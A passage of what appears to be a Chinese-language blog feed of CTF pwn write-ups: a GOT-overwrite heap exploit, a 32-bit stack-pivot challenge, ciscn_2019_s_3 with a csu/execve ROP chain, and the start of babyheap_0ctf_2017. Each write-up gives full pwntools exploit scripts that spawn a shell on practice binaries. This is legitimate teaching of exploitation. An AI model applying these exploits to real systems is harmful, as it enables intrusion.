\n&#x27;</span><br><span class="line">    b&#x27;7f9330ce9000-7f9330d0f000 r-xp 00000000 08:01 155898                     /lib/x86_64-linux-gnu/ld-2.23.so\n&#x27;</span><br><span class="line">    b&#x27;7f9330ef4000-7f9330ef7000 rw-p 00000000 00:00 0 \n&#x27;</span><br><span class="line">    b&#x27;7f9330f0d000-7f9330f0e000 rw-p 00000000 00:00 0 \n&#x27;</span><br><span class="line">    b&#x27;7f9330f0e000-7f9330f0f000 r--p 00025000 08:01 155898                     /lib/x86_64-linux-gnu/ld-2.23.so\n&#x27;</span><br><span class="line">    b&#x27;7f9330f0f000-7f9330f10000 rw-p 00026000 08:01 155898                     /lib/x86_64-linux-gnu/ld-2.23.so\n&#x27;</span><br><span class="line">    b&#x27;7f9330f10000-7f9330f11000 rw-p 00000000 00:00 0 \n&#x27;</span><br><span class="line">    b&#x27;7ffc6a9c0000-7ffc6a9e1000 rw-p 00000000 00:00 0                          [stack]\n&#x27;</span><br><span class="line">    b&#x27;7ffc6a9ed000-7ffc6a9f0000 r--p 00000000 00:00 0                          [vvar]\n&#x27;</span><br><span class="line">    b&#x27;7ffc6a9f0000-7ffc6a9f2000 r-xp 00000000 00:00 0                          [vdso]\n&#x27;</span><br><span class="line">    b&#x27;ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]\n&#x27;</span><br></pre></td></tr></table></figure><p>于是我们只好利用gdb动调 最后在-51的位置 可以使我们构造的chunk结构通过glibc的检查</p><p><a href="https://pic.imgdb.cn/item/637b451116f2c2beb147a1a0.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/637b451116f2c2beb147a1a0.png"></a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x68</span>,<span class="string">b&quot;/bin/sh&quot;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">51</span>)+p64(free_got)</span><br><span class="line">edit(<span class="number">5</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">payload = p64(system_addr)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>随后我们将该chunk申请出来 并且计算一下偏移 将我们想要修改的heaparray覆盖成free_got </p><p>这样我们下次想要利用edit函数修改其内容时  就会转化成修改free_got的内容</p><p>然后我们释放掉一个内容为&#x2F;bin&#x2F;sh的堆块 就相当于执行了system（”&#x2F;bin&#x2F;sh”）</p><p>但是在这里我遇到了个问题  不能使用我们之前为了方便打包好的函数</p><p>因为多接收了个done  但是系统调用后并不会输出done 所以这里会有卡壳</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Black Watch 入群题</title>
      <link href="/2022/11/18/Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98/"/>
      <url>/2022/11/18/Black-Watch-%E5%85%A5%E7%BE%A4%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>做的时候发现忘记了好多知识点 复现一下 不然本来这题的知识点以前的博客都有讲到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/chen/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>没开金丝雀和pie 32位 ida看看</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vul_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [esp+0h] [ebp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">strlen</span>(m1);</span><br><span class="line">  write(<span class="number">1</span>, m1, v0);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x200</span>u);</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(m2);</span><br><span class="line">  write(<span class="number">1</span>, m2, v1);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x20</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键函数 给了两次溢出的机会 第二次只能溢出两个字长 看到这里就应该反应过来是栈迁移</p><p>第一个read写入的地址是bss段</p><p>这里我一开始想的是写入shellcode 打不通后仔细想了想 重新学习了NX保护</p><p>NX保护简单理解就是使内存页的数据不可执行</p><p>那为什么我们可以构造rop链呢 因为rop链的执行流控制是利用栈帧的ret指令来实现的</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">libcmath</span>(<span class="params">function_addr,function_name</span>):</span><br><span class="line">    libc_addr = function_addr - libc.sym[function_name]</span><br><span class="line">    system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> system_addr,binsh_addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">offset,gadget2_addr,call_addr,rdx,rsi,rdi,gadget1_addr,ret_addr</span>):</span><br><span class="line">    payload = cyclic(offset)</span><br><span class="line">    payload += p64(gadget2_addr)</span><br><span class="line">    payload += cyclic(<span class="number">0x8</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(<span class="number">1</span>)</span><br><span class="line">    payload += p64(call_addr)</span><br><span class="line">    payload += p64(rdx)</span><br><span class="line">    payload += p64(rsi)</span><br><span class="line">    payload += p64(rdi)</span><br><span class="line">    payload += p64(gadget1_addr)</span><br><span class="line">    payload += cyclic(<span class="number">56</span>)</span><br><span class="line">    payload += p64(ret_addr)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">localconnect</span>(<span class="params">filename</span>):</span><br><span class="line">    io = process(filename)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remoteconnect</span>(<span class="params">ip,port</span>):</span><br><span class="line">    io = remote(ip,port)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">elf_libc</span>(<span class="params">filename,libc_name</span>):</span><br><span class="line">    elf = ELF(filename)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line">    <span class="keyword">return</span> elf,libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">button</span>):</span><br><span class="line">    <span class="keyword">if</span>(button==<span class="number">1</span>):</span><br><span class="line">        context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;pwn&#x27;</span></span><br><span class="line">libc_name = <span class="string">&#x27;buu_libc_ubuntu16_32&#x27;</span></span><br><span class="line">ip=<span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">port=<span class="number">27820</span></span><br><span class="line">elf,libc = elf_libc(filename,libc_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = remoteconnect(ip,port)</span><br><span class="line">debug(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;What is your name?&quot;</span>)</span><br><span class="line">puts_plt = <span class="number">0x8048350</span></span><br><span class="line">write_plt = <span class="number">0x8048380</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;What do you want to say?&quot;</span>)</span><br><span class="line">bss_addr = <span class="number">0x804A300</span></span><br><span class="line">leave_addr = <span class="number">0x08048408</span></span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+p32(bss_addr-<span class="number">4</span>)+p32(leave_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">write_addr = u32(io.recv())</span><br><span class="line">system_addr,binsh_addr = libcmath(write_addr,<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;What is your name?&quot;</span>)</span><br><span class="line">payload = p32(system_addr)+p32(<span class="number">0</span>)+p32(binsh_addr)</span><br><span class="line">io.send(payload)</span><br></pre></td></tr></table></figure><p>说一下思路吧  第一个read构造write泄露基址 然后要返回main函数 进行下一次的system系统调用</p><p>然后栈迁移到对应的地址-4  这里的-4前面的专门讲解栈迁移的篇幅有提到</p><p>接下来就是构造system的链 然后执行了</p><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">libcmath</span>(<span class="params">function_addr,function_name</span>):</span><br><span class="line">    libc_addr = function_addr - libc.sym[function_name]</span><br><span class="line">    system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> system_addr,binsh_addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">offset,gadget2_addr,call_addr,rdx,rsi,rdi,gadget1_addr,ret_addr</span>):</span><br><span class="line">    payload = cyclic(offset)</span><br><span class="line">    payload += p64(gadget2_addr)</span><br><span class="line">    payload += cyclic(<span class="number">0x8</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(<span class="number">1</span>)</span><br><span class="line">    payload += p64(call_addr)</span><br><span class="line">    payload += p64(rdx)</span><br><span class="line">    payload += p64(rsi)</span><br><span class="line">    payload += p64(rdi)</span><br><span class="line">    payload += p64(gadget1_addr)</span><br><span class="line">    payload += cyclic(<span class="number">56</span>)</span><br><span class="line">    payload += p64(ret_addr)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">localconnect</span>(<span class="params">filename</span>):</span><br><span class="line">    io = process(filename)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remoteconnect</span>(<span class="params">ip,port</span>):</span><br><span class="line">    io = remote(ip,port)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">elf_libc</span>(<span class="params">filename,libc_name</span>):</span><br><span class="line">    elf = ELF(filename)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line">    <span class="keyword">return</span> elf,libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">button</span>):</span><br><span class="line">    <span class="keyword">if</span>(button==<span class="number">1</span>):</span><br><span class="line">        context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;pwn&#x27;</span></span><br><span class="line">libc_name = <span class="string">&#x27;buu_libc_ubuntu16_32&#x27;</span></span><br><span class="line">ip=<span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">port=<span class="number">27820</span></span><br><span class="line">elf,libc = elf_libc(filename,libc_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = remoteconnect(ip,port)</span><br><span class="line">debug(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;What is your name?&quot;</span>)</span><br><span class="line">puts_plt = <span class="number">0x8048350</span></span><br><span class="line">write_plt = <span class="number">0x8048380</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;What do you want to say?&quot;</span>)</span><br><span class="line">bss_addr = <span class="number">0x804A300</span></span><br><span class="line">leave_addr = <span class="number">0x08048408</span></span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+p32(bss_addr-<span class="number">4</span>)+p32(leave_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">write_addr = u32(io.recv())</span><br><span class="line">system_addr,binsh_addr = libcmath(write_addr,<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;What is your name?&quot;</span>)</span><br><span class="line">payload = p32(system_addr)+p32(<span class="number">0</span>)+p32(binsh_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;What do you want to say?&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+p32(bss_addr-<span class="number">4</span>)+p32(leave_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_2019_s_3</title>
      <link href="/2022/11/14/ciscn-2019-s-3/"/>
      <url>/2022/11/14/ciscn-2019-s-3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>主体函数非常简单 利用系统调用号实现了一次输入和输出</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = sys_read(<span class="number">0</span>, buf, <span class="number">0x400</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> sys_write(<span class="number">1u</span>, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有一个gadget函数 看一下汇编代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004004D6 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:00000000004004D6</span><br><span class="line">.text:00000000004004D6 ; Attributes: bp-based frame</span><br><span class="line">.text:00000000004004D6</span><br><span class="line">.text:00000000004004D6                 public gadgets</span><br><span class="line">.text:00000000004004D6 gadgets         proc near</span><br><span class="line">.text:00000000004004D6 ; __unwind &#123;</span><br><span class="line">.text:00000000004004D6                 push    rbp</span><br><span class="line">.text:00000000004004D7                 mov     rbp, rsp</span><br><span class="line">.text:00000000004004DA                 mov     rax, 0Fh</span><br><span class="line">.text:00000000004004E1                 retn</span><br><span class="line">.text:00000000004004E1 gadgets         endp ; sp-analysis failed</span><br><span class="line">.text:00000000004004E1</span><br><span class="line">.text:00000000004004E2 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004004E2                 mov     rax, 3Bh ; &#x27;;&#x27;</span><br><span class="line">.text:00000000004004E9                 retn</span><br><span class="line">.text:00000000004004E9 ; ---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><p>下方的0x3b则为59 是execve的系统调用号</p><p>应该是构造rop链 但是这题没有办法泄露libc基址 从而也没有办法获取&#x2F;bin&#x2F;sh的地址</p><p>所以只能通过写入栈上</p><p>要想利用栈 先得获得栈的地址 发现sys_write函数可以打印出0x30字节 而buf距离rbp只有0x10</p><p>还有一点需要注意 发现vuln函数的结尾并没有leave指令 也就是说我们只需要覆盖rbp就可以控制程序执行流</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004004ED ; __unwind &#123;</span><br><span class="line">.text:00000000004004ED                 push    rbp</span><br><span class="line">.text:00000000004004EE                 mov     rbp, rsp</span><br><span class="line">.text:00000000004004F1                 xor     rax, rax</span><br><span class="line">.text:00000000004004F4                 mov     edx, 400h       ; count</span><br><span class="line">.text:00000000004004F9                 lea     rsi, [rsp+buf]  ; buf</span><br><span class="line">.text:00000000004004FE                 mov     rdi, rax        ; fd</span><br><span class="line">.text:0000000000400501                 syscall                 ; LINUX - sys_read</span><br><span class="line">.text:0000000000400503                 mov     rax, 1</span><br><span class="line">.text:000000000040050A                 mov     edx, 30h ; &#x27;0&#x27;  ; count</span><br><span class="line">.text:000000000040050F                 lea     rsi, [rsp+buf]  ; buf</span><br><span class="line">.text:0000000000400514                 mov     rdi, rax        ; fd</span><br><span class="line">.text:0000000000400517                 syscall                 ; LINUX - sys_write</span><br><span class="line">.text:0000000000400519                 retn</span><br><span class="line">.text:0000000000400519 vuln            endp ; sp-analysis failed</span><br><span class="line">.text:0000000000400519</span><br><span class="line">.text:0000000000400519 ; ---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,26678)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&quot;/bin/sh\x00&quot;</span>+<span class="string">b&quot;a&quot;</span>*<span class="number">7</span>+<span class="string">b&quot;c&quot;</span>+p64(main_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;c&quot;</span>)</span><br><span class="line">io.recv(<span class="number">16</span>)</span><br><span class="line">stack_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">gdb.attach(io)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr))</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/zA0tpj"><a href="https://s1.ax1x.com/2022/11/14/zA0tpj.png" title="zA0tpj.png" class="gallery-item"><img src="https://s1.ax1x.com/2022/11/14/zA0tpj.png" alt="zA0tpj.png"></a></a></p><p>可以看到泄露出了栈上的地址 但是此时我们并没有办法得知其与写入栈上的&#x2F;bin&#x2F;sh的偏移</p><p>这里的原因暂时没有办法得知 先放着这个疑问</p><p>下面我们进行系统调用 由于需要用到三个寄存器 所以这里用到csu</p><p>具体的流程我就不过多赘述了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rdi_addr = <span class="number">0x4005a3</span></span><br><span class="line">syscall_addr = <span class="number">0x400517</span></span><br><span class="line">int59_addr = <span class="number">0x4004E2</span></span><br><span class="line">gadget2_addr = <span class="number">0x400596</span></span><br><span class="line">gadget1_addr = <span class="number">0x400580</span></span><br><span class="line">payload = <span class="string">b&quot;/bin/sh\x00&quot;</span>+<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>+p64(int59_addr)+p64(gadget2_addr)</span><br><span class="line">payload += cyclic(<span class="number">0x8</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">binsh_addr = stack_addr - <span class="number">0x138</span></span><br><span class="line">payload += p64(binsh_addr+<span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(gadget1_addr)</span><br><span class="line">payload += cyclic(<span class="number">56</span>)</span><br><span class="line">payload += p64(rdi_addr)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(syscall_addr)</span><br><span class="line">io.sendline(payload)</span><br></pre></td></tr></table></figure><p>这里重点解释一下三个方面</p><p>1.为什么要多出一个p64(int59_addr)在栈上</p><p>这是因为call指令的问题 他跳转的是对应地址中存储的值 我们如果直接跳转到int59_addr是调用失败的</p><p>2.binsh_addr和stack_addr的偏移是怎么求出来的</p><p>我们将断点打在csu执行到call r12那一行</p><p>然后gdb看一下栈</p><p><a href="https://imgse.com/i/zABw2d"><a href="https://s1.ax1x.com/2022/11/14/zABw2d.png" title="zABw2d.png" class="gallery-item"><img src="https://s1.ax1x.com/2022/11/14/zABw2d.png" alt="zABw2d.png"></a></a></p><p>可以计算出偏移为0x138</p><p>还有第二种办法可以查看到&#x2F;bin&#x2F;sh位于栈上的地址 stack 24实际上是以rsp往高地址方向</p><p>如果我们使rsp的地址减少 就可以做到查看低地址处的栈内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set $rsp = $rsp-0x150</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/zABhxs"><a href="https://s1.ax1x.com/2022/11/14/zABhxs.png" title="zABhxs.png" class="gallery-item"><img src="https://s1.ax1x.com/2022/11/14/zABhxs.png" alt="zABhxs.png"></a></a></p><p>看到这里你也能够理解我们赋值给r12的binsh_addr+0x10是什么用意了吧</p><p>最终exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,26678)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&quot;/bin/sh\x00&quot;</span>+<span class="string">b&quot;a&quot;</span>*<span class="number">7</span>+<span class="string">b&quot;c&quot;</span>+p64(main_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;c&quot;</span>)</span><br><span class="line">io.recv(<span class="number">16</span>)</span><br><span class="line">stack_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">binsh_addr = stack_addr - <span class="number">0x138</span></span><br><span class="line">rdi_addr = <span class="number">0x4005a3</span></span><br><span class="line">syscall_addr = <span class="number">0x400517</span></span><br><span class="line">int59_addr = <span class="number">0x4004E2</span></span><br><span class="line">gadget2_addr = <span class="number">0x400596</span></span><br><span class="line">gadget1_addr = <span class="number">0x400580</span></span><br><span class="line">payload = <span class="string">b&quot;/bin/sh\x00&quot;</span>+<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>+p64(int59_addr)+p64(gadget2_addr)</span><br><span class="line">payload += cyclic(<span class="number">0x8</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(binsh_addr+<span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(gadget1_addr)</span><br><span class="line">payload += cyclic(<span class="number">56</span>)</span><br><span class="line">payload += p64(rdi_addr)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(syscall_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>babyheap_0ctf_2017</title>
      <link href="/2022/11/14/babyheap-0ctf-2017/"/>
      <url>/2022/11/14/babyheap-0ctf-2017/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>查看一下保护机制</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>FULL RELRO要注意一下</p><p>ida反编译一下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = sub_B70(a1, a2, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    <span class="keyword">switch</span> ( choice() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1LL</span>:</span><br><span class="line">        add(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2LL</span>:</span><br><span class="line">        edit(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3LL</span>:</span><br><span class="line">        delete(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4LL</span>:</span><br><span class="line">        print(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5LL</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要留意的是释放堆块的时候 指针也置零了 没有办法uaf</p><p>但是edit可以进行堆溢出</p><p>题目docker环境为16.04 那么显而易见 有输出函数以及堆溢出的机会</p><p>这里用到unsortedbin泄露基址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#前置exp:</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25931</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Command:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Command:&quot;</span>)</span><br><span 